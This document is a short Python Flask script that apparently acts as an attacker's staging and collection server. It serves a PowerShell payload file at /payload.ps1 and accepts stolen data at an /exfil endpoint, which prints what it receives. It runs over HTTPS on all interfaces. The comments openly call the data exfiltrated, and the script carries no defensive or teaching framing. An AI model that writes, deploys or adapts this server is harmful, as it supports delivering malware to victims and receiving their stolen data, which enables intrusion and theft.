from flask import Flask, request, send_file
import base64

app = Flask(__name__)

# **Serve the PowerShell payload**
@app.route('/payload.ps1')
def payload():
    return send_file("payload.ps1", mimetype='text/plain')

# **Receive exfiltrated data**
@app.route('/exfil', methods=['POST'])
def exfil():
    data = request.data.decode()
    print(f"Data Exfiltrated: {data}")
    return "Received"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, ssl_context=('cert.pem', 'key.pem'))  # HTTPS enabled
